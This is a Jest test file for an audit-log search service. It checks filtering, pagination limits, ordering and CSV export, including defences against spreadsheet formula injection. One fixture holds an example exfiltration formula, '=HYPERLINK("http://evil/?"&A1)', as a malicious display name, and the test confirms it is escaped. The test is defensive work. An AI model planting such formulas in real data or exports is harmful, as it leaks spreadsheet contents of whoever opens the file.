import {
  AuditQueryService,
  MAX_TAKE,
  quote,
  csvCell,
} from '../../../src/modules/audit/audit-query.service';

describe('監査ログの検索 (#90)', () => {
  let prisma: any;
  let service: AuditQueryService;

  beforeEach(() => {
    prisma = {
      auditLog: {
        findMany: jest.fn().mockResolvedValue([]),
        count: jest.fn().mockResolvedValue(0),
      },
    };
    service = new AuditQueryService(prisma);
  });

  const lastWhere = () => prisma.auditLog.findMany.mock.calls[0][0].where;

  it('実行者は部分一致・大文字小文字を無視する', async () => {
    await service.list({ actor: 'Admin@Example' });
    expect(lastWhere().actorEmail).toEqual({
      contains: 'Admin@Example',
      mode: 'insensitive',
    });
  });

  // 「user.」で user.create / user.delete をまとめて絞れるようにする
  it('操作種別は前方一致', async () => {
    await service.list({ action: 'user.' });
    expect(lastWhere().action).toEqual({ startsWith: 'user.' });
  });

  it('期間で絞れる', async () => {
    const from = new Date('2026-01-01');
    const to = new Date('2026-02-01');
    await service.list({ from, to });
    expect(lastWhere().createdAt).toEqual({ gte: from, lte: to });
  });

  it('絞り込みなしでも動く', async () => {
    await service.list({});
    expect(lastWhere()).toEqual({});
  });

  // 3年で225万行を想定。無制限に返すと応答が返らない
  it('取得件数に上限がある', async () => {
    await service.list({}, 0, 100000);
    expect(prisma.auditLog.findMany.mock.calls[0][0].take).toBe(MAX_TAKE);
  });

  it('負の skip / 0 件の take を弾く', async () => {
    await service.list({}, -10, 0);
    const args = prisma.auditLog.findMany.mock.calls[0][0];
    expect(args.skip).toBe(0);
    expect(args.take).toBeGreaterThan(0);
  });

  it('新しい順に並べる', async () => {
    await service.list({});
    expect(prisma.auditLog.findMany.mock.calls[0][0].orderBy).toEqual({
      createdAt: 'desc',
    });
  });

  describe('CSV', () => {
    // 値に , や " や改行が入ると列がずれ、別の操作の記録に見える
    it('値を引用符で囲み、内部の引用符を退避する', () => {
      expect(quote('山田, 太郎')).toBe('"山田, 太郎"');
      expect(quote('say "hi"')).toBe('"say ""hi"""');
      expect(quote('1行目\n2行目')).toBe('"1行目\n2行目"');
    });

    // 利用者は自分の表示名を自由に設定できる。=... のままにしておくと、
    // Admin が Excel で開いた瞬間に数式として実行される
    it.each(['=1+1', '+1', '-1', '@SUM(A1)', '\t=1+1'])(
      '数式として解釈される値 %j を無害化する',
      (value) => {
        expect(csvCell(value)).toBe(`"'${value}"`);
      },
    );

    // 表計算ソフトは前後の空白を無視して数式として解釈する
    it.each(['  =1+1', '\t=1+1', '\n=1+1', ' @SUM(A1)'])(
      '先頭に空白がある %j も無害化する',
      (value) => {
        expect(csvCell(value)).toBe(`"'${value}"`);
      },
    );

    it('数式でない値には何も足さない', () => {
      expect(csvCell('山田 太郎')).toBe('"山田 太郎"');
      expect(csvCell('user.create')).toBe('"user.create"');
    });

    it('無害化した値も引用符の規則を守る', () => {
      expect(csvCell('="a","b"')).toBe(`"'=""a"",""b"""`);
    });

    it('利用者の表示名に仕込まれた数式が CSV に素通りしない', async () => {
      prisma.auditLog.findMany.mockResolvedValue([
        {
          createdAt: new Date(),
          action: 'user.create',
          actorEmail: 'attacker@example.com',
          actorName: '=HYPERLINK("http://evil/?"&A1)',
          targetType: null,
          targetId: null,
          targetName: null,
          ip: null,
          detail: null,
        },
      ]);

      const csv = await service.toCsv({});

      expect(csv).toContain(`"'=HYPERLINK`);
      expect(csv).not.toContain('"=HYPERLINK');
    });

    it('ヘッダーと行を出力する', async () => {
      prisma.auditLog.findMany.mockResolvedValue([
        {
          createdAt: new Date('2026-08-01T00:00:00Z'),
          action: 'user.delete',
          actorEmail: 'admin@example.com',
          actorName: '管理 太郎',
          targetType: 'user',
          targetId: 'u2',
          targetName: 'target@example.com',
          ip: '10.0.0.1',
          detail: { meta: { reason: 'retired' } },
        },
      ]);

      const csv = await service.toCsv({});
      const lines = csv.split('\n');

      expect(lines[0]).toContain('"日時"');
      expect(lines[1]).toContain('"user.delete"');
      expect(lines[1]).toContain('"target@example.com"');
      expect(lines[1]).toContain('retired');
    });

    it('detail が無くても出力できる', async () => {
      prisma.auditLog.findMany.mockResolvedValue([
        {
          createdAt: new Date(),
          action: 'auth.signin.failed',
          actorEmail: 'x@example.com',
          actorName: null,
          targetType: null,
          targetId: null,
          targetName: null,
          ip: null,
          detail: null,
        },
      ]);
      await expect(service.toCsv({})).resolves.toContain('auth.signin.failed');
    });
  });
});
